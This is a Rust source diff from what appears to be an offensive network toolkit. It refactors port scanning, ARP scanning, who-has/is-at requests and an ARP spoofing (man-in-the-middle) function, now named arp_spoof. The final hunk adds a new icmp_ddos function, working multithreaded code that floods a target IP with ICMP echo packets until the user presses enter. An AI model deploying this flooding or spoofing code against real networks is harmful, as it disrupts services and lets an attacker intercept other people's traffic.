@@ -4,7 +4,7 @@ use crate::*;
 
 pub fn scan_ports(config: &Config) -> Result<Vec<u16>, CursedErrorHandle> {
     let target: Ipv4 = match config.get_tip() {
-        Some(target) => target,
+        Some(target) => target.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -14,7 +14,7 @@ pub fn scan_ports(config: &Config) -> Result<Vec<u16>, CursedErrorHandle> {
     };
 
     let threads_count: u64 = match config.get_threads() {
-        Some(threads_count) => threads_count,
+        Some(threads_count) => threads_count.clone(),
         None => {
             println!("!!! Since you didn\'t specified --threads option we will use 1 as default value !!!");
             1
@@ -35,7 +35,7 @@ pub fn scan_ports(config: &Config) -> Result<Vec<u16>, CursedErrorHandle> {
 
     for i in 0..threads_count {
         let target: Ipv4 = target.clone();
-        let timeout: Option<u64> = config.get_timeout();
+        let timeout: Option<u64> = config.get_timeout().clone();
         threads.push(thread::spawn(move || {
             scan_ports_thread(target, threads_count, i, timeout)
         }))
@@ -109,7 +109,7 @@ fn scan_ports_thread(
 
 pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHandle> {
     let netmask: Ipv4 = match config.get_netmask() {
-        Some(netmask) => netmask,
+        Some(netmask) => netmask.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -119,7 +119,7 @@ pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHand
     };
 
     let interface: String = match config.get_interface() {
-        Some(interface) => interface,
+        Some(interface) => interface.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -129,7 +129,7 @@ pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHand
     };
 
     let threads_count: u64 = match config.get_threads() {
-        Some(threads_count) => threads_count,
+        Some(threads_count) => threads_count.clone(),
         None => {
             println!("!!! Since user didn\'t specified --threads option we will use 1 as default value !!!");
             1
@@ -137,7 +137,7 @@ pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHand
     };
 
     let timeout: u64 = match config.get_timeout() {
-        Some(wait) => wait,
+        Some(wait) => wait.clone(),
         None => {
             println!("!!! Since user didn\'t specified --timeout option we will use 250 as default value !!!");
             250
@@ -145,7 +145,7 @@ pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHand
     };
 
     let wait: u64 = match config.get_wait() {
-        Some(wait) => wait,
+        Some(wait) => wait.clone(),
         None => {
             println!(
                 "!!! Since user didn\'t specified --wait option we will use 0 as default value !!!"
@@ -174,7 +174,7 @@ pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHand
     };
 
     let target: Ipv4 = match config.get_tip() {
-        Some(target) => target,
+        Some(target) => target.clone(),
         None => {
             let ip: Ipv4 = arp.get_src_ip().clone();
             println!("!!! Since user didn\'t specified --tip option we will use machine ip instead ({}) !!!", ip);
@@ -211,7 +211,7 @@ pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHand
                     Err(_) => {}
                 }
                 if let Ok(response) =
-                    arp_reference.read_arp_timeout(Duration::from_millis(timeout), false)
+                    arp_reference.read_arp_timeout(false, Duration::from_millis(timeout))
                 {
                     responses.push(response);
                     print!(".");
@@ -239,7 +239,7 @@ pub fn scan_network(config: &Config) -> Result<Vec<(Ipv4, Mac)>, CursedErrorHand
     arp.destroy();
 
     for response in responses {
-        devices.push((response.get_src_ip(), response.get_src_mac()))
+        devices.push((response.get_src_ip().clone(), response.get_src_mac().clone()))
     }
 
     Ok(devices)
@@ -300,7 +300,7 @@ fn send_wh_requests(info: SendWHInfo) {
 
 pub fn who_has(config: &Config) -> Result<(Ipv4, Mac), CursedErrorHandle> {
     let target: Ipv4 = match config.get_tip() {
-        Some(target) => target,
+        Some(target) => target.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -310,7 +310,7 @@ pub fn who_has(config: &Config) -> Result<(Ipv4, Mac), CursedErrorHandle> {
     };
 
     let interface: String = match config.get_interface() {
-        Some(interface) => interface,
+        Some(interface) => interface.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -319,7 +319,7 @@ pub fn who_has(config: &Config) -> Result<(Ipv4, Mac), CursedErrorHandle> {
         }
     };
 
-    let timeout: Option<u64> = config.get_timeout();
+    let timeout: Option<u64> = config.get_timeout().clone();
 
     let arp: Arp = match Arp::new(&interface[..], false) {
         Ok(arp) => arp,
@@ -331,7 +331,7 @@ pub fn who_has(config: &Config) -> Result<(Ipv4, Mac), CursedErrorHandle> {
     }
 
     let result: Result<ArpResponse, CursedErrorHandle> = match timeout {
-        Some(timeout) => arp.read_arp_timeout(Duration::from_millis(timeout), false),
+        Some(timeout) => arp.read_arp_timeout(false, Duration::from_millis(timeout)),
         None => arp.read_arp(false),
     };
 
@@ -342,12 +342,12 @@ pub fn who_has(config: &Config) -> Result<(Ipv4, Mac), CursedErrorHandle> {
         Err(err) => return Err(err),
     };
 
-    Ok((response.get_src_ip(), response.get_src_mac()))
+    Ok((response.get_src_ip().clone(), response.get_src_mac().clone()))
 }
 
 pub fn is_at(config: &Config) -> Result<(), CursedErrorHandle> {
     let dst_ip: Ipv4 = match config.get_tip() {
-        Some(dst_ip) => dst_ip,
+        Some(dst_ip) => dst_ip.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -357,7 +357,7 @@ pub fn is_at(config: &Config) -> Result<(), CursedErrorHandle> {
     };
 
     let dst_mac: Mac = match config.get_tmac() {
-        Some(dst_mac) => dst_mac,
+        Some(dst_mac) => dst_mac.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -367,7 +367,7 @@ pub fn is_at(config: &Config) -> Result<(), CursedErrorHandle> {
     };
 
     let src_ip: Ipv4 = match config.get_sip() {
-        Some(src_ip) => src_ip,
+        Some(src_ip) => src_ip.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -377,7 +377,7 @@ pub fn is_at(config: &Config) -> Result<(), CursedErrorHandle> {
     };
 
     let src_mac: Mac = match config.get_smac() {
-        Some(src_mac) => src_mac,
+        Some(src_mac) => src_mac.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -387,7 +387,7 @@ pub fn is_at(config: &Config) -> Result<(), CursedErrorHandle> {
     };
 
     let interface: String = match config.get_interface() {
-        Some(interface) => interface,
+        Some(interface) => interface.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -408,9 +408,9 @@ pub fn is_at(config: &Config) -> Result<(), CursedErrorHandle> {
     result
 }
 
-pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
+pub fn arp_spoof(config: &Config) -> Result<(), CursedErrorHandle> {
     let target_ip: Ipv4 = match config.get_tip() {
-        Some(target) => target,
+        Some(target) => target.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -420,7 +420,7 @@ pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
     };
 
     let host_ip: Ipv4 = match config.get_sip() {
-        Some(host) => host,
+        Some(host) => host.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
@@ -430,17 +430,17 @@ pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
     };
 
     let interface: String = match config.get_interface() {
-        Some(interface) => interface,
+        Some(interface) => interface.clone(),
         None => {
             return Err(CursedErrorHandle::new(
                 CursedError::NotEnought,
-                String::from("--interface is required for is at request"),
+                String::from("--interface is required for arp spoofing"),
             ))
         }
     };
 
     let wait: u64 = match config.get_wait() {
-        Some(wait) => wait,
+        Some(wait) => wait.clone(),
         None => {
             println!(
                 "!!! Since user didn\'t specified --wait option we will use 0 as default value !!!"
@@ -449,14 +449,14 @@ pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
         }
     };
 
-    let timeout: Option<u64> = config.get_timeout();
+    let timeout: Option<u64> = config.get_timeout().clone();
 
     let arp: Arp = match Arp::new(&interface[..], false) {
         Ok(arp) => arp,
         Err(err) => return Err(err),
     };
     let mitm_mac: Mac = match config.get_amac() {
-        Some(mitm_mac) => mitm_mac,
+        Some(mitm_mac) => mitm_mac.clone(),
         None => {
             let mitm_mac: Mac = arp.get_src_mac().clone();
             println!("!!! Since user didn\'t specified --amac option we will use interface mac instead ({}) !!!", mitm_mac);
@@ -465,7 +465,7 @@ pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
     };
 
     let target_mac: Mac = match config.get_tmac() {
-        Some(target_mac) => target_mac,
+        Some(target_mac) => target_mac.clone(),
         None => {
             println!("!!! Since user didn\'t specified --tmac option we will use arp who has request to get it !!!");
             if let Err(err) = arp.who_has(&target_ip, false) {
@@ -473,19 +473,19 @@ pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
             }
 
             let result: Result<ArpResponse, CursedErrorHandle> = match timeout {
-                Some(timeout) => arp.read_arp_timeout(Duration::from_millis(timeout), false),
+                Some(timeout) => arp.read_arp_timeout(false, Duration::from_millis(timeout)),
                 None => arp.read_arp(false),
             };
 
             match result {
-                Ok(response) => response.get_src_mac(),
+                Ok(response) => response.get_src_mac().clone(),
                 Err(err) => return Err(err),
             }
         }
     };
 
     let host_mac: Mac = match config.get_smac() {
-        Some(host_mac) => host_mac,
+        Some(host_mac) => host_mac.clone(),
         None => {
             println!("!!! Since user didn\'t specified --smac option we will use arp who has request to get it !!!");
             if let Err(err) = arp.who_has(&host_ip, false) {
@@ -493,12 +493,12 @@ pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
             }
 
             let result: Result<ArpResponse, CursedErrorHandle> = match timeout {
-                Some(timeout) => arp.read_arp_timeout(Duration::from_millis(timeout), false),
+                Some(timeout) => arp.read_arp_timeout(false, Duration::from_millis(timeout)),
                 None => arp.read_arp(false),
             };
 
             match result {
-                Ok(response) => response.get_src_mac(),
+                Ok(response) => response.get_src_mac().clone(),
                 Err(err) => return Err(err),
             }
         }
@@ -571,3 +571,123 @@ pub fn spoof(config: &Config) -> Result<(), CursedErrorHandle> {
 
     Ok(())
 }
+
+pub fn icmp_ddos(config: &Config) -> Result<(), CursedErrorHandle> {
+    let target_ip: Ipv4 = match config.get_tip() {
+        Some(target) => target.clone(),
+        None => {
+            return Err(CursedErrorHandle::new(
+                CursedError::NotEnought,
+                String::from("--tip is required for icmp ddos"),
+            ))
+        }
+    };
+    
+    let interface: String = match config.get_interface() {
+        Some(interface) => interface.clone(),
+        None => {
+            return Err(CursedErrorHandle::new(
+                CursedError::NotEnought,
+                String::from("--interface is required for icmp ddos"),
+            ))
+        }
+    };
+
+    let gateway_mac: Mac = match config.get_gmac() {
+        Some(mac) => mac.clone(),
+        None => {
+            println!("\
+                !!! Since user didn\'t specified --gmac \
+                we will get ip with arp who has request (--timeout is used here) !!!\
+            ");
+
+            let gateway_ip: Ipv4 = match config.get_gip() {
+                Some(gateway_ip) => gateway_ip.clone(),
+                None => return Err(CursedErrorHandle::new(
+                    CursedError::NotEnought,
+                    String::from("--gmac or --gip is required for icmp ddos"),
+                )),
+            };
+
+            let timeout: Option<u64> = config.get_timeout().clone();
+
+            let arp: Arp = match Arp::new(&interface[..], false) {
+                Ok(arp) => arp,
+                Err(err) => return Err(err),
+            };
+        
+            if let Err(err) = arp.who_has(&gateway_ip, false) {
+                return Err(err)
+            }
+            let result: Result<ArpResponse, CursedErrorHandle> = match timeout {
+                Some(timeout) => arp.read_arp_timeout(false, Duration::from_millis(timeout)),
+                None => arp.read_arp(false),
+            };
+            
+            arp.destroy();
+
+            let gateway_mac: Mac = match result {
+                Ok(response) => response.get_src_mac().clone(),
+                Err(err) => return Err(err),
+            };
+
+            gateway_mac
+        },
+    };
+
+    let threads_count: u64 = match config.get_threads() {
+        Some(threads_count) => threads_count.clone(),
+        None => {
+            println!("!!! Since user didn\'t specified --threads option we will use 1 as default value !!!");
+            1
+        },
+    };
+
+    let icmp: Icmp = match Icmp::new(&interface[..], false) {
+        Ok(icmp) => icmp,
+        Err(err) => return Err(err)
+    };
+
+    const MESSAGE_SIZE: usize = 5;
+    let message: [u8; MESSAGE_SIZE] = [0xff; MESSAGE_SIZE];
+    
+    let message: &[u8] = &message;
+    let target_ip: &Ipv4 = &target_ip;
+    let gateway_mac: &Mac = &gateway_mac;
+    let icmp_reference: &Icmp = &icmp;
+    thread::scope(|scope: &thread::Scope| {
+        let mut threads: Vec<(thread::ScopedJoinHandle<()>, std::sync::mpsc::Sender<()>)> = Vec::new();
+        for _ in 0..threads_count {
+            let (sender, receiver) = std::sync::mpsc::channel();
+            let thread: thread::ScopedJoinHandle<()> = scope.spawn(move || icmp_ddos_thread(icmp_reference, target_ip, gateway_mac, message, receiver));
+            
+            threads.push((thread, sender))
+        }
+
+        print!("Press enter to end task:");
+        let _ = std::io::stdout().flush();
+
+        let mut buffer: String = String::new();
+        let _ = std::io::stdin().read_line(&mut buffer);
+
+        for thread in threads {
+            thread.1.send(()).expect("Can\'t terminate thread");
+            thread.0.join().expect("Can\'t join thread")
+        }
+    });
+
+    icmp.destroy();
+
+    Ok(())
+}
+
+fn icmp_ddos_thread(icmp: &Icmp, target_ip: &Ipv4, gateway_mac: &Mac, message: &[u8], receiver: std::sync::mpsc::Receiver<()>) {
+    loop {
+        match receiver.try_recv() {
+            Ok(_) | Err(std::sync::mpsc::TryRecvError::Disconnected) => break,
+            Err(_) => {}
+        }
+
+        let _ = icmp.echo(target_ip, gateway_mac, message, false);
+    }
+} 
